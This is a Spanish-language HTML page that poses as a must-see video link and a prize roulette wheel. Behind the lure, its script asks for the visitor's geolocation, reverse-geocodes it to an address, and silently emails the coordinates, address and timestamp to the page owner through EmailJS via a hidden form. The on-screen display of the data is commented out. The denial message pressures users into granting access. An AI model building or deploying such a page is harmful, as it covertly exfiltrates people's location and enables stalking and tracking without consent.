<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Suerte</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 50px;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
    }
    #ubicacion, #error {
      margin-top: 20px;
      font-size: 18px;
    }
    #error {
      color: red;
    }
    body {
    text-align: center;
    font-family: Arial, sans-serif;
    background: #f4f4f4;
  }

  h1 {
    margin-top: 20px;
  }

  .ruleta-container {
    position: relative;
    width: 300px;
    height: 300px;
    margin: 40px auto;
  }

  .ruleta {
    width: 100%;
    height: 100%;
    border-radius: 50%;
    border: 8px solid #333;
    position: relative;
    overflow: hidden;
    transition: transform 4s ease-out;
  }

  .sector {
    position: absolute;
    width: 50%;
    height: 50%;
    background: red;
    transform-origin: 100% 100%;
    clip-path: polygon(0 0, 100% 0, 100% 100%);
  }

  .sector:nth-child(1) { transform: rotate(0deg); background: #ff7675; }
  .sector:nth-child(2) { transform: rotate(60deg); background: #74b9ff; }
  .sector:nth-child(3) { transform: rotate(120deg); background: #55efc4; }
  .sector:nth-child(4) { transform: rotate(180deg); background: #ffeaa7; }
  .sector:nth-child(5) { transform: rotate(240deg); background: #a29bfe; }
  .sector:nth-child(6) { transform: rotate(300deg); background: #fab1a0; }

  .puntero {
    position: absolute;
    top: -20px;
    left: 50%;
    transform: translateX(-50%);
    width: 0;
    height: 0;
    border-left: 15px solid transparent;
    border-right: 15px solid transparent;
    border-bottom: 30px solid black;
  }

  button {
    padding: 10px 20px;
    font-size: 18px;
    cursor: pointer;
  }

  #resultado {
    margin-top: 20px;
    font-size: 20px;
    font-weight: bold;
  }
  </style>
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
</head>
<body>

  <h1>Debes ver este video</h1>
  <p>Haz clic en el botón para ver el contenido.</p>

  <button onclick="obtenerUbicacion()">Mostrar Contenido</button>

  <div id="ubicacion"></div>
  <div id="error"></div>

  <!-- Formulario oculto para enviar datos -->
  <form id="contact-form" style="display:none;">
    <input type="hidden" name="resultado" id="resultado">
  </form>

  <script>
    emailjs.init("ocAv84lXHr4gAKLqP"); // Tu USER ID de EmailJS

    function obtenerUbicacion() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(mostrarPosicion, mostrarError);
      } else {
        document.getElementById("error").innerText = "Geolocalización no soportada por este navegador.";
      }
    }

    function mostrarPosicion(posicion) {
      const lat = posicion.coords.latitude;
      const lon = posicion.coords.longitude;

      const fechaHora = new Date().toLocaleString();

      // Llamar a la API de geocodificación inversa
      fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
        .then(res => res.json())
        .then(data => {
          const direccion = data.display_name || "Dirección no disponible";

          const resumen = `Fecha/Hora: ${fechaHora}\nLatitud: ${lat}\nLongitud: ${lon}\nDirección aproximada: ${direccion}`;

          //document.getElementById("ubicacion").innerText = resumen;
          document.getElementById("resultado").value = resumen;

          // Enviar automáticamente
          emailjs.sendForm('service_epkqnyh', 'template_65vhrq8', document.getElementById('contact-form'))
            .then(() => {
              alert("¡excelente!");
            })
            .catch(error => {
              alert("Error al enviar: " + JSON.stringify(error));
            });
        })
        .catch(() => {
          document.getElementById("error").innerText = "No se pudo obtener.";
        });
    }

    function mostrarError(error) {
      let mensaje;
      switch (error.code) {
        case error.PERMISSION_DENIED:
          mensaje = "Debes permitir el acceso a tu ubicación para ver contenido.";
          break;
        case error.POSITION_UNAVAILABLE:
          mensaje = "no disponible.";
          break;
        case error.TIMEOUT:
          mensaje = "Tiempo de espera agotado.";
          break;
        default:
          mensaje = "Error desconocido.";
      }
      document.getElementById("error").innerText = "Error: " + mensaje;
    }
  </script>
<h1>🎡 Ruleta de Premios</h1>

<div class="ruleta-container">
  <div class="puntero"></div>
  <div class="ruleta" id="ruleta">
    <div class="sector"></div>
    <div class="sector"></div>
    <div class="sector"></div>
    <div class="sector"></div>
    <div class="sector"></div>
    <div class="sector"></div>
  </div>
</div>

<button onclick="girar()">Girar</button>

<div id="resultadox"></div>

<script>
  const premios = [
    "💰 $10",
    "🎁 Regalo",
    "😢 Inténtalo otra vez",
    "💵 $50",
    "🎉 Premio sorpresa",
    "🍀 $100"
  ];

  let girando = false;

  function girar() {
    if (girando) return;

    girando = true;

    const ruleta = document.getElementById("ruleta");
    const resultadox = document.getElementById("resultadox");

    let vueltas = Math.floor(Math.random() * 5) + 5;
    let anguloFinal = Math.floor(Math.random() * 360);

    let rotacion = (vueltas * 360) + anguloFinal;

    ruleta.style.transform = `rotate(${rotacion}deg)`;

    setTimeout(() => {
      let sector = Math.floor((360 - (anguloFinal % 360)) / 60) % 6;
      resultadox.innerText = "Ganaste: " + premios[sector];
      girando = false;
    }, 4000);
  }
</script>

</body>
</html>
